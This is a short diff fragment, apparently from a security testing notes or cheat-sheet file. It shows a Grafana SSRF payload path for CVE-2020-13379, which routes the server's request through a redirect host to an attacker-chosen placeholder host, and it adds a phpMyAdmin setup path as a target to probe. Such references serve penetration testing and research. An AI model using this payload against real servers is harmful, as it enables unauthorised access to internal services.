@@ -32,3 +32,7 @@ info:
 **(CVE-2020-13379) SSRF:**
 
 ``/avatar/test%3fd%3dredirect.rhynorater.com%25253f%253b%252fbp.blogspot.com%252fYOURHOSTHERE``
+
+#Phpmyadmin:
+
+/phpmyadmin/setup/
